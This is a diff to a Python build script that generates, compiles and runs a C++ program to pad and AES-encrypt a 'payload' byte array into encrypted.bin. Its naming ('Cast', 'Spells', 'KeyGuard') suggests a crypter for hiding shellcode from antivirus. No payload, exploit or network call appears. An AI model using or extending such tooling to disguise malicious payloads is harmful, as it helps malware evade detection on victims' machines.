@@ -1,5 +1,6 @@
 import os
 import re
+import subprocess
 
 KeyGuard = None
 
@@ -31,32 +32,44 @@ def get_keyguard():
 
 def build_encryptor (Encryption, Payload):
 
+    Payload_Str = "static const unsigned char Data_RawData[] = {" + ", ".join(map(lambda b: hex(b), Payload)) + "};"
+
     f = open ("Cast\\encryptor.cpp", "a")
     f.write(f"""
 #include <iostream>
 #include <string> 
 #include <Windows.h>
 #include <stdio.h>
+#include <cassert>
 #include "../Spells/EncryptionSpells/{Encryption}"
 #include "../Spells/EncryptionSpells/Padding.h"
 
-FILE create_ecrypted_binary_file(PBYTE pPayloadAddress, DWORD pPayloadSize)
+VOID create_ecrypted_binary_file(PBYTE pPayloadAddress, SIZE_T pPayloadSize)
 {{
     FILE *file;
     file = fopen("encrypted.bin", "wb");
     fwrite(pPayloadAddress, pPayloadSize, 1, file);
     fclose(file);
 }}
-            
+
+{Payload_Str}
+
 int main()
 {{
     PBYTE pPayloadAddress;
     SIZE_T pPayloadSize;  
 
-    {Payload}
+    pPayloadSize = {len(Payload)};
 
-    pPayloadSize = sizeof(Data_RawData);
-    pPayloadAddress = Data_RawData;
+    pPayloadAddress = (PBYTE)malloc(pPayloadSize);
+    if (pPayloadAddress == NULL)
+    {{
+        printf("Memory allocation failed.\\n");
+        return 1;
+    }}
+    memcpy(pPayloadAddress, Data_RawData, pPayloadSize);
+    
+    printf("Payload Size: %d\\n", pPayloadSize);
 
     //SIZE_T payloadSize = (SIZE_T)pPayloadSize;
     PaddBuffer(pPayloadAddress, pPayloadSize, &pPayloadAddress, &pPayloadSize);
@@ -67,17 +80,24 @@ int main()
     size_t sKeySize = sizeof(OriginalKey);
     PBYTE pbKey = (PBYTE)OriginalKey;
 
+    assert("ciaone");
     Encrypt(pPayloadAddress, pPayloadSize, pbKey, sKeySize, &pPayloadAddress, &pPayloadSize);
 
     create_ecrypted_binary_file(pPayloadAddress, pPayloadSize);
+    
+    free(pPayloadAddress);
             
     return 0;
 }}
 """)
     
     f.close()
-    os.system(f"g++ --static -w -o Cast\\encryptor Cast\\encryptor.cpp Cast\\TinyAES.c ")
-    os.system("Cast\\encryptor.exe")
+    subprocess.run(f"g++ --static -g -w -o Cast\\encryptor Cast\\encryptor.cpp Cast\\TinyAES.c ")
+    result = subprocess.run(["Cast\\encryptor.exe"])
+    if result.returncode != 0:
+        print("Error: encryptor.exe did not execute successfully.")
+        #os.remove("Cast\\encryptor.cpp")
+        #os.remove("Cast\\encryptor.exe")
     os.remove("Cast\\encryptor.cpp")
     os.remove("Cast\\encryptor.exe")
     return
@@ -85,5 +105,5 @@ int main()
 def read_encrypted_payload():
     with open("encrypted.bin", "rb") as file:
         content = file.read()
-        payload = "unsigned char Data_RawData[] = {" + ", ".join(map(lambda b: hex(b), content)) + "};"
+        payload = "static const unsigned char Data_RawData[] = {" + ", ".join(map(lambda b: hex(b), content)) + "};"
         return payload
